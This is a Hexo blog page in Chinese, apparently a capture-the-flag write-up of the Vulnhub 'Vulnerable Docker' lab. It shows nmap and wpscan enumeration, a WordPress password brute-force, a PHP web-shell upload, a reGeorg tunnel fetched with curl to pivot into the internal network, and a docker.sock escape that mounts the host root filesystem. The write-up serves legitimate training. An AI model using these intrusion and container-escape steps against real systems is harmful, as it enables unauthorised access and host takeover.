@@ -1,0 +1,557 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>记一次对Vulnerable Docker靶机渗透全过程</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《记一次对Vulnerable Docker靶机渗透全过程》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		11/12/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/11/12/记一次对Vulnerable Docker靶机渗透全过程/" itemprop="url">		
+			记一次对Vulnerable Docker靶机渗透全过程		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/11/12/记一次对Vulnerable Docker靶机渗透全过程/" itemprop="url">
+	<time datetime="2018-11-12T03:43:21.414Z" itemprop="datePublished">
+  		2018-11-12
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="记一次对Vulnerable-Docker靶机渗透全过程"><a href="#记一次对Vulnerable-Docker靶机渗透全过程" class="headerlink" title="记一次对Vulnerable Docker靶机渗透全过程"></a>记一次对Vulnerable Docker靶机渗透全过程</h2><p><code>Vulnhub</code>它是一个提供各种漏洞环境的平台，里面大部分的环境是要用<code>VMware</code>或者<code>VirtualBox</code>打开运行的。</p>
+<p>今天我主要是使用<code>VMware</code>搭建一个<code>Vulnerable Docker</code>靶机环境，主要是为了练习使用。</p>
+<p>完整找出所有<code>flag</code>只是基本任务，实现提权才是终极目标。我并不追求最快夺旗，而是尽可能运用所学的知识完整的运用在这套靶机中，所以，</p>
+<p>这篇文章中，或许某些内容对拿到<code>flag</code>无直接帮助，但在应对真实目标时，还是有一点帮助的。</p>
+<h3 id="0x01-Vulnerable-Docker靶机下载"><a href="#0x01-Vulnerable-Docker靶机下载" class="headerlink" title="0x01:Vulnerable Docker靶机下载"></a>0x01:Vulnerable Docker靶机下载</h3><p><a href="https://www.vulnhub.com" target="_blank" rel="noopener">https://www.vulnhub.com</a></p>
+<p>里面有各种各样的镜像，可以下载到自己的机子上面练习。</p>
+<p><img src="https://i.imgur.com/VNKLqoP.png" alt=""></p>
+<p>(需要我们注意的是，下载靶机环境的时候，我们需要提前看清这个靶机环境是否支持<code>VMware</code>的安装，否则就不可以安装在<code>VWMare</code>上面)</p>
+<p>今天我们选择的是使用<code>Vulnerable Docker: 1</code>靶机环境</p>
+<p>首先：这个靶机环境支持<code>VMware</code>环境的安装。</p>
+<p>其次：靶机环境比较简单(<code>flag</code>只有三个)</p>
+<p><img src="https://i.imgur.com/sEkxD1v.png" alt=""></p>
+<p>靶机下载地址：<code>Download</code>：<a href="https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova" target="_blank" rel="noopener">https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova</a></p>
+<h3 id="0x02-Vulnerable-Docker靶机安装"><a href="#0x02-Vulnerable-Docker靶机安装" class="headerlink" title="0x02:Vulnerable Docker靶机安装"></a>0x02:Vulnerable Docker靶机安装</h3><p>下载完成之后就会看见有<code>ova</code>格式的文件</p>
+<p><img src="https://i.imgur.com/USt4UH2.png" alt=""></p>
+<p>双击导入<code>VMware</code>中就可以了（具体操作过程）</p>
+<p><img src="https://i.imgur.com/QP8RptF.png" alt=""></p>
+<p>点击下一步：</p>
+<p><img src="https://i.imgur.com/ktp0iXd.png" alt=""></p>
+<p>最后等待导入完成，导入速度看本机性能和镜像的大小</p>
+<p><img src="https://i.imgur.com/qJMn3yX.png" alt=""></p>
+<p>再对靶机环境进行配置一下：</p>
+<p><img src="https://i.imgur.com/4CuBndW.png" alt=""></p>
+<p>启动<code>Vulnerable Docker</code>靶机就可以看见</p>
+<h3 id="0x03-完成任务！"><a href="#0x03-完成任务！" class="headerlink" title="0x03:完成任务！"></a>0x03:完成任务！</h3><p>作者给我们的描述是：这里里面有三个<code>flag</code>(其中的<code>flag_2</code>被发行者无意中遗漏了)</p>
+<blockquote>
+<p>We have planted 3 flag files across the various machines / systems that are available to you</p>
+<p>Your mission if you choose to accept would be as following:</p>
+<p>Identify all the flags (2 in total: flag_1 and flag_3) (flag_2 was inadvertently left out)</p>
+</blockquote>
+<h4 id="1-网络扫描"><a href="#1-网络扫描" class="headerlink" title="1:网络扫描"></a>1:网络扫描</h4><p>启动<code>Vulnerable Docker</code>靶机就可以看见：</p>
+<p><img src="https://i.imgur.com/m1kW9Kk.png" alt=""></p>
+<p>使用<code>nmap</code>对靶机<code>IP</code>地址进行扫描：</p>
+<pre><code>nmap -A 192.168.232.134
+</code></pre><p><img src="https://i.imgur.com/3m3tFqt.png" alt=""></p>
+<h4 id="2：flag-1"><a href="#2：flag-1" class="headerlink" title="2：flag_1"></a>2：flag_1</h4><p>我们先打开<code>8000</code>端口，看看有没有<code>flag</code>：</p>
+<p><img src="https://i.imgur.com/f039gkV.png" alt=""></p>
+<p>使用<code>WPscan</code>进行漏洞扫描：</p>
+<pre><code>wpscan --url http://192.168.232.134:8000/
+</code></pre><p><img src="https://i.imgur.com/mWHN7yu.png" alt=""></p>
+<p>打开链接：<a href="http://192.168.232.134:8000/robots.txt" target="_blank" rel="noopener">http://192.168.232.134:8000/robots.txt</a></p>
+<p><img src="https://i.imgur.com/UkEm5eA.png" alt=""></p>
+<p>使用<code>WPscan</code>进行枚举用户名：</p>
+<pre><code>wpscan --url http://192.168.232.134:8000/ --enumerate u
+</code></pre><p><img src="https://i.imgur.com/fdxps0Y.png" alt=""></p>
+<p>按照正常思维对用户名进行爆破：</p>
+<pre><code>wpscan --url http://192.168.232.134:8000/ -e u --wordlist /root/桌面/1.txt
+</code></pre><p><img src="https://i.imgur.com/hoO2xU7.png" alt=""></p>
+<p>并没有爆破得到任何信息(QAQ)：</p>
+<p>这个时候需要我们再回头开始看起，看见一个链接，<code>wordpress</code>的登录端口：<a href="http://192.168.232.134:8000/wp-admin/" target="_blank" rel="noopener">http://192.168.232.134:8000/wp-admin/</a></p>
+<p><img src="https://i.imgur.com/t88NjmE.png" alt=""></p>
+<p>使用刚刚爆破出来的用户名<code>bob</code>填进去就可以了，而在这里的密码需要使用<code>burp</code>进行爆破(具体操作过程)</p>
+<p><img src="https://i.imgur.com/cuA4bCK.png" alt=""></p>
+<p><img src="https://i.imgur.com/6SFWoqf.png" alt=""></p>
+<p>爆破得到：</p>
+<p><img src="https://i.imgur.com/g3T2LER.png" alt=""></p>
+<p>成功登录后台(经过一系列的乱翻之后就会找到）</p>
+<p><img src="https://i.imgur.com/JaQ9QzY.png" alt=""></p>
+<h4 id="3：flag-3"><a href="#3：flag-3" class="headerlink" title="3：flag_3"></a>3：flag_3</h4><p>这下面的操作是在我的另一个<code>kali</code>中的操作（具体原因下文会提到)</p>
+<p>如果可以进入<code>Wordpress</code>的后台，那么拿<code>shell</code>就很简单了，使用在线编辑功能就可以。</p>
+<p>使用菜刀上传一句话(<code>php</code>)</p>
+<p><img src="https://i.imgur.com/Ywh9r18.png" alt=""></p>
+<p>连上<code>shell</code>后收集了下面的一些信息</p>
+<p>数据库中的信息：</p>
+<pre><code>define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+define(&#39;DB_USER&#39;, &#39;wordpress&#39;);
+define(&#39;DB_PASSWORD&#39;, &#39;WordPressISBest&#39;);
+define(&#39;DB_HOST&#39;, &#39;db:3306&#39;);
+</code></pre><p>系统是 <code>Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux</code>，用户是</p>
+<p><code>www-data</code>，这么新的系统直接就可以放弃提权了，否则<code>Dirty COW</code>之类的洞还是超级好用的，不过我们可以参考下面这一篇文章，找到一点灵感</p>
+<p>可以参考<code>Tunnel Manager - From RCE to Docker Escape</code>：<a href="https://paper.seebug.org/396/" target="_blank" rel="noopener">https://paper.seebug.org/396/</a></p>
+<p><img src="https://i.imgur.com/rIpidsq.jpg" alt=""></p>
+<p><strong>ip addr</strong></p>
+<pre><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
+link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+inet 127.0.0.1/8 scope host lo
+   valid_lft forever preferred_lft forever
+5: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+inet 172.18.0.2/16 scope global eth0
+   valid_lft forever preferred_lft forever
+</code></pre><p><img src="https://i.imgur.com/2ejNS3o.jpg" alt=""></p>
+<p>想起题目是<code>Vulnerable Docker VM</code>，猜想应该就是<code>docker.sock</code>或者<code>HTTP API</code>未授权访问之类的问题，不过翻了下没找到什么。</p>
+<p>但是看机器的<code>IP</code>，感觉这个虚拟机里面应该还有个<code>docker network</code>的内网，简单的<code>ping</code>了下，发现至少是存在<code>172.18.0.1-4</code>的，这时候</p>
+<p>需要做一下内网穿透，这样方便在我的电脑上操作，否则<code>shell</code>里面缺少很多工具和依赖，比较麻烦。</p>
+<p>我使用的是 <code>reGeorg</code>：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+<pre><code>curl -o tunnel.php 
+
+https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
+</code></pre><p>浏览器访问了一下，显示<code>Georg says,&#39;All seems fine&#39;</code></p>
+<p>本地电脑上运行<code>python reGeorgSocksProxy.py -u http://192.168.30.171:8000/tunnel.php</code></p>
+<pre><code>[INFO   ]  Log Level set to [INFO]
+[INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.30.171:8000/tunnel.php]
+[INFO   ]  Checking if Georg is ready
+[INFO   ]  Georg says, &#39;All seems fine&#39;
+</code></pre><p>因为<code>reGeorg</code>提供的是<code>socks5</code>代理，所以需要本地使用<code>proxychains</code>具体配置不多说了</p>
+<p><code>proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4</code> 连接数据库，</p>
+<p>但是并没有找到什么 <code>flag</code>，然后继续扫内网，还是<code>nmap</code>那一堆命令加上<code>proxychains</code>前缀就好。</p>
+<p>然后发现一个<code>IP</code>有个奇怪的端口</p>
+<pre><code>Nmap scan report for 172.18.0.3
+Host is up (0.0062s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE
+22/tcp   open  ssh
+8022/tcp open  oa-system
+</code></pre><p><code>curl</code>看了下，貌似是一个网页，然后在设置了浏览器的<code>socks5</code>代理，就看到了，原来是一个网页版<code>ssh</code>，而且这里面终于有<code>docker.sock</code>。</p>
+<p><img src="https://i.imgur.com/hJcX1uN.png" alt=""></p>
+<p>接下来就是老套路了，可以参考 ：<strong>Docker学习与remote API未授权访问分析和利用</strong>：<a href="https://www.secpulse.com/archives/55928.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/55928.html</a></p>
+<p>而我是直接在另一个<code>kali</code>中里面安装了一个<code>docker</code>，这样就可以操作主机上的<code>docker</code>了。</p>
+<p><img src="https://i.imgur.com/sD8emwD.jpg" alt=""></p>
+<p>然后使用<code>volume</code>挂载主机上的所有文件到一个目录</p>
+<pre><code>docker run -it --rm -v /:/vol wordpress /bin/bash
+</code></pre><p>这样就可以看到<code>flag_3</code>了</p>
+<p><img src="https://i.imgur.com/jqnrfR5.png" alt=""></p>
+<p>关于这一个靶机漏洞可以学习到很多知识</p>
+<p>首先：关于<code>wordpress</code>漏洞</p>
+<p>其次：提权中遇到的关于<code>Tunnel Manager - From RCE to Docker Escape</code>漏洞</p>
+<p>最后：关于<code>Docker</code>的自学以及<code>Docker</code>学习与<code>remote API</code>未授权访问分析和利用</p>
+<p>参考资料：</p>
+<p><strong>Vulnerable Docker靶机下载</strong>：<a href="https://www.vulnhub.com/entry/vulnerable-docker-1,208/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/vulnerable-docker-1,208/</a></p>
+<p><strong>Docker学习与remote API未授权访问分析和利用</strong>：<a href="https://www.secpulse.com/archives/55928.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/55928.html</a></p>
+<p><strong>WPScan使用完整教程之记一次对WordPress的渗透过程：</strong> <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46194&amp;page=1#pid511454" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46194&amp;page=1#pid511454</a></p>
+<p><strong>Docker学习</strong>：<a href="https://www.bilibili.com/video/av17854410?from=search&amp;seid=13990341548063716463" target="_blank" rel="noopener">https://www.bilibili.com/video/av17854410?from=search&amp;seid=13990341548063716463</a></p>
+<p><strong>Tunnel Manager - From RCE to Docker Escape</strong>：<a href="https://paper.seebug.org/396/" target="_blank" rel="noopener">https://paper.seebug.org/396/</a></p>
+<p><strong>reGeorg</strong>：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2018/11/12/记一次对`vulnhub`中`Android4`靶机渗透测试全过程/" title="记一次对`vulnhub`中`Android4`靶机渗透测试全过程">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/11/12/记一次关于HTTP服务的七层架构技术解析及运用/" title="记一次关于HTTP服务的七层架构技术解析及运用">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
+
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
+
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#记一次对Vulnerable-Docker靶机渗透全过程"><span class="post-toc-text">记一次对Vulnerable Docker靶机渗透全过程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-Vulnerable-Docker靶机下载"><span class="post-toc-text">0x01:Vulnerable Docker靶机下载</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-Vulnerable-Docker靶机安装"><span class="post-toc-text">0x02:Vulnerable Docker靶机安装</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-完成任务！"><span class="post-toc-text">0x03:完成任务！</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-网络扫描"><span class="post-toc-text">1:网络扫描</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2：flag-1"><span class="post-toc-text">2：flag_1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3：flag-3"><span class="post-toc-text">3：flag_3</span></a></li></ol></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
